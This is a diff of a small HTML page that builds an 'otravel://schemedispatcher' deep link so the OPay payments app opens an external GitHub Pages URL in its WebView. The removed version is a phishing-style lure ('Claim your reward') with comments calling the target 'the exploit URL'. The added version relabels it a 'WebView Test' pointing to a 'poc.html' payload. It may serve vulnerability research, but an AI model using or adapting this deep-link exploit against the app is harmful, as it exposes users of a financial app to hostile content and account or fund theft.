@@ -1,59 +1,27 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPay Rewards Redirect</title>
+    <title>OPay Deep Link Redirect</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background-color: #f4f4f4;
-        }
-
-        .btn {
-            display: inline-block;
-            background-color: #00c853;
-            color: white;
-            padding: 20px 40px;
-            font-size: 24px;
-            border-radius: 10px;
-            text-decoration: none;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
-        }
-
-        .btn:active {
-            transform: scale(0.98);
-        }
-
-        p {
-            color: #333;
-            font-size: 18px;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
+        .btn { display: inline-block; background-color: #00c853; color: white; padding: 20px 40px; font-size: 24px; border-radius: 10px; text-decoration: none; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); margin-top: 20px; }
+        p { color: #333; font-size: 18px; }
     </style>
 </head>
 
 <body>
-    <h1>🎁 OPay Rewards</h1>
-    <p>Click below to claim your reward in the OPay app!</p>
+    <h1>OPay WebView Test</h1>
+    <p>Click below to open the diagnostic page in OPay.</p>
 
     <a id="deepLinkBtn" class="btn" href="#">Open OPay App</a>
 
     <script>
-        // The exploit URL hosted on GitHub Pages
-        const exploitDisplayUrl = "https://zugonwobi.github.io/opay-rewards/index.html";
-
-        // The deep link scheme to trigger the WebView
-        const deepLink = "otravel://schemedispatcher?action=" + exploitDisplayUrl;
-
-        // Set the button href
-        document.getElementById("deepLinkBtn").href = deepLink;
-
-        // Auto-click attempt (optional, might be blocked by some browsers)
-        // window.location.href = deepLink;
+        const payloadUrl = 'https://zugonwobi.github.io/opay-rewards/poc.html?v=' + Date.now();
+        const deepLink = 'otravel://schemedispatcher?scheme=' + encodeURIComponent(payloadUrl);
+        document.getElementById('deepLinkBtn').href = deepLink;
     </script>
 </body>
 
